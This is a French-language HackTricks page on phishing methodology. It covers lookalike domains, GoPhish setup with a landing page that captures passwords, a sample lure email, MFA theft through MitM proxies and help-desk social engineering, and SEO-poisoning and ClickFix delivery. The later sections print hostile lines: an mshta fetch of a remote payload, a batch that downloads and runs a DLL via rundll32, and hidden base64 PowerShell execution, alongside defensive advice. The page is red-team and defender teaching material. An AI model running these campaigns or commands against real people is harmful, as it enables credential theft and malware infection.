# Méthodologie de phishing

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie

1. Effectuer une reconnaissance de la victime
   1. Sélectionner le **domaine de la victime**.
   2. Effectuer une énumération web de base en **recherchant les portails de connexion** utilisés par la victime et **décider** lequel vous allez **usurper**.
   3. Utiliser des techniques d’**OSINT** pour **trouver des adresses e-mail**.
2. Préparer l’environnement
   1. **Acheter le domaine** que vous allez utiliser pour l’évaluation de phishing.
   2. **Configurer les enregistrements liés au service de messagerie** (SPF, DMARC, DKIM, rDNS).
   3. Configurer le VPS avec **gophish**.
3. Préparer la campagne
   1. Préparer le **modèle d’e-mail**.
   2. Préparer la **page web** destinée à voler les identifiants.
4. Lancer la campagne !

## Générer des noms de domaine similaires ou acheter un domaine de confiance

### Techniques de variation des noms de domaine

- **Keyword** : le nom de domaine **contient** un **mot-clé** important du domaine d’origine (p. ex., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain** : remplacer le **point par un tiret** dans un sous-domaine (p. ex., www-zelster.com).
- **New TLD** : utiliser le même domaine avec un **nouveau TLD** (p. ex., zelster.org)
- **Homoglyph** : **remplacer** une lettre du nom de domaine par une **lettre qui lui ressemble** (p. ex., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **échanger deux lettres** dans le nom de domaine (p. ex., zelsetr.com).
- **Singularization/Pluralization** : ajouter ou retirer un « s » à la fin du nom de domaine (p. ex., zeltsers.com).
- **Omission** : **supprimer une** des lettres du nom de domaine (p. ex., zelser.com).
- **Repetition:** **répéter une** des lettres du nom de domaine (p. ex., zeltsser.com).
- **Replacement** : comme Homoglyph, mais de façon moins furtive. Remplacer une des lettres du nom de domaine, par exemple par une lettre proche de la lettre d’origine sur le clavier (p. ex., zektser.com).
- **Subdomained** : insérer un **point** dans le nom de domaine (p. ex., ze.lster.com).
- **Insertion** : **insérer une lettre** dans le nom de domaine (p. ex., zerltser.com).
- **Missing dot** : ajouter le TLD à la fin du nom de domaine (p. ex., zelstercom.com)

**Outils automatiques**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sites web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Il est **possible que certains bits stockés ou transmis soient automatiquement inversés** en raison de divers facteurs comme les éruptions solaires, les rayons cosmiques ou des erreurs matérielles.

Lorsque ce concept est **appliqué aux requêtes DNS**, il est possible que le **domaine reçu par le serveur DNS** ne soit pas le même que celui initialement demandé.

Par exemple, une modification d’un seul bit dans le domaine « windows.com » peut le transformer en « windnws.com ».

Les attaquants peuvent **en tirer parti en enregistrant plusieurs domaines résultant de bitflipping** similaires au domaine de la victime. Leur objectif est de rediriger les utilisateurs légitimes vers leur propre infrastructure.

Pour plus d’informations, consultez [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acheter un domaine de confiance

Vous pouvez rechercher un domaine expiré à utiliser sur [https://www.expireddomains.net/](https://www.expireddomains.net).\
Pour vous assurer que le domaine expiré que vous allez acheter **a déjà un bon référencement SEO**, vous pouvez vérifier sa catégorie sur :

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Découvrir des adresses e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % gratuit)
- [https://phonebook.cz/](https://phonebook.cz) (100 % gratuit)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Pour **découvrir d’autres** adresses e-mail valides ou **vérifier celles** que vous avez déjà trouvées, vous pouvez vérifier si vous pouvez les tester par force brute sur les serveurs SMTP de la victime. [Découvrez ici comment vérifier/trouver des adresses e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Par ailleurs, n’oubliez pas que si les utilisateurs se servent d’un **portail web pour accéder à leurs e-mails**, vous pouvez vérifier s’il est vulnérable à la **force brute sur les noms d’utilisateur** et exploiter la vulnérabilité si possible.

## Configurer GoPhish

### Installation

Vous pouvez le télécharger depuis [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Téléchargez-le et décompressez-le dans `/opt/gophish`, puis exécutez `/opt/gophish/gophish`\
Un mot de passe pour l’utilisateur admin sur le port 3333 s’affichera dans la sortie. Accédez donc à ce port et utilisez ces identifiants pour changer le mot de passe admin. Vous devrez peut-être transférer ce port en local :

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configuration

**Configuration du certificat TLS**

Avant cette étape, vous devriez **déjà avoir acheté le domaine** que vous allez utiliser, et celui-ci doit **pointer** vers **l’adresse IP du VPS** sur lequel vous configurez **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Configuration du courrier**

Commencez l’installation : `apt-get install postfix`

Ajoutez ensuite le domaine aux fichiers suivants :

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifiez également les valeurs des variables suivantes dans /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Enfin, modifiez les fichiers **`/etc/hostname`** et **`/etc/mailname`** pour y indiquer le nom de votre domaine, puis **redémarrez votre VPS.**

Créez maintenant un **enregistrement DNS A** pour `mail.<domain>` qui pointe vers **l’adresse IP** du VPS, ainsi qu’un **enregistrement DNS MX** qui pointe vers `mail.<domain>`.

Testons maintenant l’envoi d’un e-mail :

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Configuration de Gophish**

Arrêtez l’exécution de Gophish et configurons-le.\
Modifiez `/opt/gophish/config.json` comme suit (notez l’utilisation de https) :

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Configurer le service gophish**

Pour créer le service gophish afin qu’il puisse démarrer automatiquement et être géré comme un service, vous pouvez créer le fichier `/etc/init.d/gophish` avec le contenu suivant :

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Terminez la configuration du service et vérifiez son fonctionnement en procédant comme suit :

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Configuration du serveur de messagerie et du domaine

### Attendez et soyez légitime

Plus un domaine est ancien, moins il risque d’être détecté comme spam. Vous devriez donc attendre aussi longtemps que possible (au moins 1 semaine) avant l’évaluation de phishing. De plus, si vous publiez une page sur un secteur réputé, la réputation obtenue sera meilleure.

Notez que même si vous devez attendre une semaine, vous pouvez terminer toute la configuration dès maintenant.

### Configurer l’enregistrement Reverse DNS (rDNS)

Définissez un enregistrement rDNS (PTR) qui résout l’adresse IP du VPS en nom de domaine.

### Enregistrement Sender Policy Framework (SPF)

Vous devez **configurer un enregistrement SPF pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement SPF, [**consultez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Vous pouvez utiliser [https://www.spfwizard.net/](https://www.spfwizard.net) pour générer votre politique SPF (utilisez l’adresse IP de la machine VPS).

![Formulaire SPF Wizard pour générer un enregistrement SPF pour un domaine de phishing](<../../images/image (1037).png>)

Voici le contenu à définir dans un enregistrement TXT du domaine :

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Enregistrement DMARC (Domain-based Message Authentication, Reporting & Conformance)

Vous devez **configurer un enregistrement DMARC pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement DMARC, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Vous devez créer un nouvel enregistrement DNS TXT pointant vers le nom d’hôte `_dmarc.<domain>` et contenant ce qui suit :

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Vous devez **configurer un DKIM pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement DKIM, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ce tutoriel est basé sur : [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Vous devez concaténer les deux valeurs B64 générées par la clé DKIM :
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testez le score de configuration de votre e-mail

Vous pouvez le faire sur [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accédez simplement à la page et envoyez un e-mail à l’adresse qu’ils vous indiquent :

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Vous pouvez également **vérifier la configuration de votre messagerie** en envoyant un e-mail à `check-auth@verifier.port25.com` et en **lisant la réponse** (pour cela, vous devrez **ouvrir** le port **25** et consulter la réponse dans le fichier _/var/mail/root_ si vous envoyez l’e-mail en tant que root).\
Vérifiez que vous réussissez tous les tests :

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Vous pouvez également envoyer un **message à un compte Gmail que vous contrôlez**, puis vérifier les **en-têtes de l’e-mail** dans votre boîte de réception Gmail ; `dkim=pass` devrait apparaître dans le champ d’en-tête `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Retirer votre domaine de la liste noire de Spamhouse

La page [www.mail-tester.com](https://www.mail-tester.com) peut vous indiquer si votre domaine est bloqué par Spamhaus. Vous pouvez demander le retrait de votre domaine/IP à l’adresse suivante : ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Retirer votre domaine de la liste noire de Microsoft

​​Vous pouvez demander le retrait de votre domaine/IP à l’adresse [https://sender.office.com/](https://sender.office.com).

## Créer et lancer une campagne GoPhish

### Profil d’envoi

- Définissez un **nom permettant d’identifier** le profil d’envoi
- Choisissez le compte depuis lequel vous allez envoyer les e-mails de phishing. Suggestions : _noreply, support, servicedesk, salesforce..._
- Vous pouvez laisser le nom d’utilisateur et le mot de passe vides, mais veillez à cocher « Ignorer les erreurs de certificat »

![Créer et lancer une campagne GoPhish - Profil d’envoi : vous pouvez laisser le nom d’utilisateur et le mot de passe vides, mais veillez à cocher « Ignorer les erreurs de certificat »](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Il est recommandé d’utiliser la fonctionnalité « **Envoyer un e-mail de test** » pour vérifier que tout fonctionne.\
> Je recommande d’**envoyer les e-mails de test à des adresses 10min mail** afin d’éviter d’être inscrit sur une liste noire pendant les tests.

### Modèle d’e-mail

- Définissez un **nom permettant d’identifier** le modèle
- Rédigez ensuite un **objet** (rien d’étrange, juste quelque chose que vous pourriez vous attendre à lire dans un e-mail ordinaire)
- Veillez à cocher « **Ajouter une image de suivi** »
- Rédigez le **modèle d’e-mail** (vous pouvez utiliser des variables comme dans l’exemple suivant) :

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Notez que **pour renforcer la crédibilité de l’e-mail**, il est recommandé d’utiliser une signature tirée d’un e-mail du client. Suggestions :

- Envoyez un e-mail à une **adresse inexistante** et vérifiez si la réponse contient une signature.
- Recherchez des **adresses e-mail publiques** comme info@ex.com, press@ex.com ou public@ex.com, envoyez-leur un e-mail et attendez une réponse.
- Essayez de contacter une **adresse valide découverte** et attendez une réponse.

![Profil d’envoi - Modèle d’e-mail : essayez de contacter une adresse valide découverte et attendez une réponse](<../../images/image (80).png>)

> [!TIP]
> Le modèle d’e-mail permet également **de joindre des fichiers**. Si vous souhaitez aussi voler des challenges NTLM à l’aide de fichiers/documents spécialement conçus, [consultez cette page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Page d’atterrissage

- Saisissez un **nom**
- **Écrivez le code HTML** de la page web. Notez que vous pouvez **importer** des pages web.
- Cochez **Capture Submitted Data** et **Capture Passwords**
- Définissez une **redirection**

![Modèle d’e-mail - Page d’atterrissage : cochez Capture Submitted Data et Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> En général, vous devrez modifier le code HTML de la page et effectuer quelques tests en local (par exemple, avec un serveur Apache) **jusqu’à obtenir le résultat souhaité.** Ensuite, saisissez ce code HTML dans le champ.\
> Notez que si vous devez **utiliser des ressources statiques** pour le HTML (par exemple, des pages CSS et JS), vous pouvez les enregistrer dans _**/opt/gophish/static/endpoint**_, puis y accéder depuis _**/static/\<filename>**_

> [!TIP]
> Pour la redirection, vous pouvez **rediriger les utilisateurs vers la page web principale légitime** de la victime, ou les rediriger vers _/static/migration.html_, par exemple, afficher une **roue de chargement (**[**https://loading.io/**](https://loading.io)**) pendant 5 secondes, puis indiquer que le processus a réussi**.

### Utilisateurs et groupes

- Saisissez un nom
- **Importez les données** (notez que pour utiliser le modèle de cet exemple, vous devez disposer du prénom, du nom et de l’adresse e-mail de chaque utilisateur)

![Page d’atterrissage - Utilisateurs et groupes : importez les données (notez que pour utiliser le modèle de cet exemple, vous devez disposer du prénom, du nom et de l’adresse e-mail de chaque utilisateur)](<../../images/image (163).png>)

### Campagne

Enfin, créez une campagne en choisissant un nom, le modèle d’e-mail, la page d’atterrissage, l’URL, le profil d’envoi et le groupe. Notez que l’URL correspondra au lien envoyé aux victimes.

Notez que le **profil d’envoi permet d’envoyer un e-mail de test pour voir à quoi ressemblera l’e-mail de phishing final** :

![Utilisateurs et groupes - Campagne : notez que le profil d’envoi permet d’envoyer un e-mail de test pour voir à quoi ressemblera l’e-mail de phishing final](<../../images/image (192).png>)

Une fois que tout est prêt, lancez la campagne !

## Clonage de site web

Si, pour une raison quelconque, vous souhaitez cloner le site web, consultez la page suivante :


{{#ref}}
clone-a-website.md
{{#endref}}

## Documents et fichiers backdoorés

Dans certaines évaluations de phishing (principalement pour les Red Teams), vous voudrez également **envoyer des fichiers contenant une sorte de backdoor** (peut-être un C2 ou simplement quelque chose qui déclenchera une authentification).\
Consultez la page suivante pour quelques exemples :


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via un proxy MitM

L’attaque précédente est assez ingénieuse, car vous falsifiez un vrai site web et récupérez les informations saisies par l’utilisateur. Malheureusement, si l’utilisateur n’a pas saisi le bon mot de passe ou si l’application imitée est configurée avec la 2FA, **ces informations ne vous permettront pas d’usurper l’identité de l’utilisateur piégé**.

C’est là que des outils comme [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) et [**muraena**](https://github.com/muraenateam/muraena) sont utiles. Cet outil permet de réaliser une attaque de type MitM. En résumé, les attaques se déroulent ainsi :

1. Vous **usurpez le formulaire de connexion** de la vraie page web.
2. L’utilisateur **envoie** ses **identifiants** à votre fausse page, et l’outil les transmet à la vraie page web, **en vérifiant si les identifiants fonctionnent**.
3. Si le compte est configuré avec la **2FA**, la page MitM la demande et, une fois que **l’utilisateur l’a saisie**, l’outil la transmet à la vraie page web.
4. Une fois l’utilisateur authentifié, vous, en tant qu’attaquant, aurez **capturé ses identifiants, la 2FA, le cookie et toutes les informations de ses interactions pendant que l’outil effectue une attaque MitM**.

### Via VNC

Et si, au lieu **d’envoyer la victime vers une page malveillante** qui ressemble à l’originale, vous l’envoyiez vers une **session VNC avec un navigateur connecté à la vraie page web** ? Vous pourrez voir ce qu’elle fait, voler son mot de passe, le MFA utilisé, les cookies…\
Vous pouvez le faire avec [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Détecter la détection

Évidemment, l’un des meilleurs moyens de savoir si vous avez été repéré est de **rechercher votre domaine dans les listes noires**. S’il y figure, c’est que votre domaine a été identifié comme suspect.\
Pour vérifier facilement si votre domaine figure dans une liste noire, utilisez [https://malwareworld.com/](https://malwareworld.com)

Il existe cependant d’autres moyens de savoir si la victime **recherche activement des activités de phishing suspectes dans la nature**, comme expliqué dans :


{{#ref}}
detecting-phising.md
{{#endref}}

Vous pouvez **acheter un domaine dont le nom est très similaire** à celui du domaine de la victime **et/ou générer un certificat** pour un **sous-domaine** d’un domaine que vous contrôlez **contenant** le **mot-clé** du domaine de la victime. Si la **victime** effectue une quelconque **interaction DNS ou HTTP** avec ces éléments, vous saurez qu’**elle recherche activement** des domaines suspects et que vous devrez être très discret.<sup>[[2]](#references)</sup>

### Évaluer le phishing

Utilisez [**Phishious** ](https://github.com/Rices/Phishious)pour évaluer si votre e-mail va finir dans le dossier spam, être bloqué ou réussir.

## Compromission d’identité à forte interaction (réinitialisation du MFA par le service d’assistance)

Les groupes d’intrusion modernes contournent de plus en plus les leurres par e-mail et **ciblent directement le processus du service d’assistance/de récupération d’identité** pour contourner le MFA. L’attaque repose entièrement sur le « living-off-the-land » : une fois que l’opérateur possède des identifiants valides, il se déplace à l’aide des outils d’administration intégrés — aucun malware n’est nécessaire.<sup>[[6]](#references)</sup>

### Déroulement de l’attaque
1. Reconnaissance de la victime 
   * Collectez des renseignements personnels et professionnels depuis LinkedIn, des fuites de données, GitHub public, etc.  
   * Identifiez les identités de grande valeur (cadres, informatique, finances) et recensez le **processus exact du service d’assistance** pour la réinitialisation du mot de passe/MFA.
2. Ingénierie sociale en temps réel  
   * Appelez le service d’assistance, ou contactez-le par Teams ou par chat, en usurpant l’identité de la cible (souvent à l’aide d’un **numéro d’appelant usurpé** ou d’une **voix clonée**).  
   * Fournissez les informations personnelles précédemment collectées pour réussir la vérification fondée sur des questions de sécurité.  
   * Convainquez l’agent de **réinitialiser le secret MFA** ou d’effectuer un **SIM swap** sur un numéro de mobile enregistré.
3. Actions immédiates après l’accès (≤60 min dans des cas réels)  
   * Établissez un point d’appui via n’importe quel portail SSO web.  
   * Recensez AD / AzureAD à l’aide d’outils intégrés (aucun binaire déposé) :
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Mouvement latéral avec **WMI**, **PsExec** ou des agents **RMM** légitimes déjà autorisés dans l’environnement.

### Détection et atténuation
* Traitez la récupération d’identité par le help desk comme une **opération privilégiée** – exigez une authentification renforcée et l’approbation d’un responsable.
* Déployez des règles **Identity Threat Detection & Response (ITDR)** / **UEBA** qui déclenchent une alerte en cas de :  
  * changement de méthode MFA suivi d’une authentification depuis un nouvel appareil / une nouvelle zone géographique ;
  * élévation immédiate du même principal (utilisateur-→-administrateur).
* Enregistrez les appels au help desk et exigez un **rappel vers un numéro déjà enregistré** avant toute réinitialisation.
* Mettez en place un accès **Just-In-Time (JIT) / privilégié** afin que les comptes nouvellement réinitialisés n’héritent **pas** automatiquement de jetons à privilèges élevés.

---

## Tromperie à grande échelle – Empoisonnement SEO et campagnes « ClickFix »
Les groupes opportunistes compensent le coût des opérations ciblées par des attaques de masse qui transforment les **moteurs de recherche et les réseaux publicitaires en canaux de diffusion**.<sup>[[6]](#references)</sup>

1. **L’empoisonnement SEO / la publicité malveillante** place un faux résultat, tel que `chromium-update[.]site`, en tête des annonces dans les résultats de recherche.
2. La victime télécharge un petit **loader de première étape** (souvent JS/HTA/ISO). Exemples observés par Unit 42 :
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Le loader exfiltre les cookies du navigateur et les bases de données d’identifiants, puis télécharge un **loader furtif** qui décide – *en temps réel* – de déployer :
   * un RAT (par exemple AsyncRAT, RustDesk)
   * un ransomware / wiper
   * un composant de persistance (clé Run du registre + tâche planifiée)

### Conseils de sécurisation
* Bloquez les domaines récemment enregistrés et appliquez le **filtrage DNS avancé / filtrage d’URL** aux *annonces dans les résultats de recherche* ainsi qu’aux e-mails.
* Limitez l’installation de logiciels aux packages MSI signés / Store et interdisez l’exécution de `HTA`, `ISO` et `VBS` par stratégie.
* Surveillez les processus enfants des navigateurs qui ouvrent des programmes d’installation :
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Recherchez les LOLBins fréquemment utilisés par les chargeurs de première étape (p. ex. `regsvr32`, `curl`, `mshta`).

### Détournement du clic sur le bouton de téléchargement avec redirection via TDS
Certains faux portails de logiciels gardent le `href` visible du bouton de téléchargement pointant vers la véritable URL GitHub/de la version publiée, mais détournent la **première** interaction de l’utilisateur en JavaScript et redirigent la victime vers une chaîne de **système de distribution du trafic (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Caractéristiques clés :
- Le hook s’exécute généralement pendant la **phase de capture** (`true`) sur `document`, et se déclenche donc avant les gestionnaires du site.
- Chrome utilise souvent `mousedown` au lieu de `click` pour que la redirection reste liée à un **geste utilisateur** valide et contourne plus facilement les bloqueurs de fenêtres pop-up.
- Certaines variantes ouvrent au préalable `about:blank` ou simulent des clics sur des éléments `<a target="_blank">`, puis n’assignent l’URL du TDS que plus tard.
- Les limites côté navigateur sont souvent stockées dans `localStorage` : le **premier clic** peut mener au malware, tandis que les actualisations et nouvelles tentatives renvoient vers le lien visible, d’apparence inoffensive.
- Le TDS peut appliquer des filtres selon le referrer, le domaine d’entrée, la GEO, l’empreinte du navigateur/appareil, les contrôles VPN/datacenter, le contexte du clic et les compteurs par session, ce qui rend les relectures par les analystes non déterministes.

Idées côté défense :
- Comparez le `href` **affiché** à la cible de navigation **réelle** générée au clic.
- Recherchez les gestionnaires `document.addEventListener(..., true)` qui appellent à la fois `preventDefault()` et `stopImmediatePropagation()` autour de `window.open`, `about:blank` ou de clics simulés sur des éléments d’ancrage.
- Considérez les groupes de domaines de téléchargement de logiciels récemment enregistrés, qui chargent tous la même étape CloudFront/JS, comme un indicateur fort d’empoisonnement SEO/TDS.

### ClickFix depuis de fausses pages de vérification + récupérations LOLBAS à l’apparence d’archives
Certaines branches du TDS aboutissent à une fausse page de vérification (de type Cloudflare/IUAM) qui demande à la victime d’exécuter un binaire Windows légitime, tel que :<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes :
- `mshta.exe` exécute le **HTA/VBScript au début de la réponse**, même si l’URL prétend pointer vers une archive `.7z` ; les données d’archive ajoutées peuvent n’être qu’un leurre.
- Les étapes suivantes continuent souvent à mentir sur le type de fichier (`.rtf` pour PowerShell, `.asar` pour Python, ZIP avec des binaires rembourrés), puis passent au **mappage manuel de PE / à l’exécution en mémoire**.
- Si vous intervenez sur l’une de ces chaînes, préservez les données réseau et la mémoire dès la première exécution réussie : les rejouements ultérieurs peuvent ne montrer qu’un chemin bénin d’installateur/SFX ou échouer parce que la libération du payload/de la clé était liée à la session TDS d’origine.

### Techniques de livraison de DLL ClickFix (fausse mise à jour du CERT)
* Leurre : avis d’un CERT national cloné, avec un bouton **Update** affichant des instructions de « réparation » étape par étape. Les victimes doivent exécuter un batch qui télécharge une DLL et la lance via `rundll32`.<sup>[[12]](#references)</sup>
* Chaîne batch typique observée :
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` dépose le payload dans `%TEMP%`, une courte pause masque les variations du réseau, puis `rundll32` appelle le point d’entrée exporté (`notepad`).
* La DLL signale l’identité de l’hôte et interroge le C2 toutes les quelques minutes. Les tâches distantes arrivent sous forme de **PowerShell encodé en base64**, exécuté de manière masquée et avec un contournement de la stratégie d’exécution :
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Cela préserve la flexibilité du C2 (le serveur peut remplacer les tâches sans mettre à jour la DLL) et masque les fenêtres de console. Recherchez les processus PowerShell enfants de `rundll32.exe` utilisant ensemble `-WindowStyle Hidden`, `FromBase64String` et `Invoke-Expression`.
* Les défenseurs peuvent rechercher des callbacks HTTP(S) de la forme `...page.php?tynor=<COMPUTER>sss<USER>` et des intervalles de polling de 5 minutes après le chargement de la DLL.

---

## Malvertising déclenché par l’affichage via RTB

Contrairement à un résultat de recherche sponsorisé qui nécessite un clic, une publicité RTB peut charger du JavaScript tiers lorsque sa création s’affiche sur un site Web ou dans une application. Citizen Lab a observé des balises publicitaires appelant un serveur de décision distinct avec des identifiants publicitaires. La plupart des impressions recevaient une réponse vide ; certaines impressions sélectionnées pouvaient recevoir du JavaScript. Une réponse bénigne lors d’une nouvelle lecture ne prouve donc pas que tous les utilisateurs ont reçu le même contenu.<sup>[[14]](#references)</sup>

Il s’agit d’un **mécanisme de diffusion**, et non d’un exploit en soi : l’exécution de JavaScript dans un contexte d’affichage publicitaire n’installe pas automatiquement un logiciel espion. L’exploit sous-jacent du navigateur ou du système d’exploitation n’a pas été divulgué ; une impression publicitaire ou une requête au serveur de décision ne constitue donc pas, à elle seule, une preuve d’infection. Pour les liens entre identifiants dans le ciblage RTB, consultez [Modélisation des menaces et séparation des identités](../../privacy/threat-modeling-and-identity-separation.md).<sup>[[14]](#references)</sup>

## Opérations de phishing optimisées par l’IA
Les attaquants combinent désormais des **API de LLM et de clonage vocal** pour créer des leurres entièrement personnalisés et interagir en temps réel.

| Couche | Exemple d’utilisation par un acteur malveillant |
|-------|-----------------------------|
|Automatisation|Générer et envoyer plus de 100 k e-mails / SMS avec des formulations aléatoires et des liens de suivi.|
